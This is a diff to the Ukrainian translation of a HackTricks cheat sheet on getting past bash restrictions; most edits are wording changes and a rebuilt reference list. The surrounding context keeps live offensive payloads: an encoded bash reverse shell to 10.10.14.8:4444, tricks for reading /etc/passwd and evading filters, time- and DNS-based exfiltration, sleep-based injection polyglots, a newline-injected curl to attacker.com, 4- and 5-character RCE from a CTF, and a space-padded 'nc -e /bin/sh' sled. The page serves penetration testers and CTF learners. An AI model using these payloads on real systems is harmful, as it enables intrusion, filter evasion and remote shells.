@@ -2,7 +2,7 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Обхід поширених обмежень
+## Поширені способи обходу обмежень
 
 ### Reverse Shell
 ```bash
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Обхід шляхів і заборонених слів
+### Шляхи обходу та заборонені слова
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -129,7 +129,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Часова ексфільтрація даних
+### Екфільтрація даних на основі часу
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -140,12 +140,12 @@ echo ${PATH:0:1} #/
 ```
 ### Ексфільтрація даних через DNS
 
-Наприклад, можна використовувати **burpcollab** або [**pingb**](http://pingb.in).
+Наприклад, можна використати **burpcollab** або [**pingb**](http://pingb.in).
 
 ### Builtins
 
-Якщо ви не можете виконувати зовнішні функції й маєте доступ лише до **обмеженого набору builtins для отримання RCE**, є кілька корисних прийомів. Зазвичай ви **не зможете використовувати всі** **builtins**, тому слід **знати всі доступні варіанти**, щоб спробувати обійти jail. Ідея від [**devploit**](https://twitter.com/devploit).\
-Спочатку перевірте всі [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Далі наведено кілька **рекомендацій**:
+Якщо ви не можете виконувати зовнішні функції й маєте доступ лише до **обмеженого набору builtins для отримання RCE**, є кілька корисних прийомів. Зазвичай ви **не зможете використовувати всі** **builtins**, тому варто **знати всі доступні варіанти**, щоб спробувати обійти jail. Ідея від [**devploit**](https://twitter.com/devploit).\
+Перш за все перевірте всі [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Нижче наведено кілька **рекомендацій**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Обхід потенційних regex
+### Обхід потенційних regex-фільтрів
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -212,7 +212,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### RCE з 5 символами
+### RCE за допомогою 5 символів
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -259,7 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### RCE у 4 символи
+### RCE за допомогою 4 символів
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -294,17 +294,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Read-Only/Noexec/Distroless Bypass
+## Обхід Read-Only/Noexec/Distroless
 
-Якщо ви перебуваєте всередині файлової системи із захистом **read-only і noexec** або навіть у distroless container, усе ще існують способи **виконувати довільні бінарні файли, навіть shell!:**
-
+Якщо ви перебуваєте у файловій системі із захистом **read-only і noexec** або навіть у distroless container, усе ще існують способи **виконувати довільні бінарні файли, навіть shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
-
+## Обхід Chroot та інших Jails
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -312,31 +310,30 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Коли вразливість дає змогу частково контролювати аргумент, який зрештою передається до `system()` або іншого shell, ви можете не знати точного зміщення, з якого виконання почне зчитувати ваш payload. Традиційні NOP sled (наприклад, `\x90`) **не працюють у синтаксисі shell**, але Bash безпечно ігноруватиме початкові пробільні символи перед виконанням команди.
+Коли вразливість дає змогу частково контролювати аргумент, який зрештою передається до `system()` або іншого shell, ви можете не знати точного зміщення, з якого почнеться читання вашого payload. Традиційні NOP sleds (наприклад, `\x90`) **не** працюють у shell-синтаксисі, але Bash безпечно ігнорує початкові пробіли перед виконанням команди.
 
-Тому ви можете створити *NOP sled для Bash*, додавши перед реальною командою довгу послідовність пробілів або символів табуляції:
+Тому ви можете створити *NOP sled для Bash*, додавши перед реальною командою довгу послідовність пробілів або символів табуляції:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Якщо ROP chain (або будь-який primitive для пошкодження пам’яті) спрямовує instruction pointer у будь-яке місце в межах блоку пробілів, парсер Bash просто пропускає пробіли, доки не досягне `nc`, надійно виконуючи вашу команду.
+Якщо ROP chain (або будь-який primitive memory-corruption) встановлює instruction pointer у будь-яке місце всередині блоку пробілів, Bash parser просто пропускає whitespace, доки не досягне `nc`, надійно виконуючи вашу команду.
 
 Практичні випадки використання:
 
 1. **Memory-mapped configuration blobs** (наприклад, NVRAM), доступні між процесами.
-2. Ситуації, у яких attacker не може записувати NULL bytes для вирівнювання payload.
-3. Embedded-пристрої, на яких доступний лише BusyBox `ash`/`sh` — вони також ігнорують пробіли на початку.
+2. Ситуації, коли attacker не може записувати NULL bytes для вирівнювання payload.
+3. Embedded devices, де доступний лише BusyBox `ash`/`sh` — вони також ігнорують пробіли на початку.
 
-> 🛠️  Поєднайте цей трюк із ROP gadgets, які викликають `system()`, щоб значно підвищити надійність exploit на IoT-маршрутизаторах з обмеженою пам’яттю.
+> 🛠️  Поєднайте цей trick із ROP gadgets, які викликають `system()`, щоб суттєво підвищити надійність exploit на IoT routers з обмеженою пам'яттю.
 
-## Посилання та додаткові матеріали
+## References
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
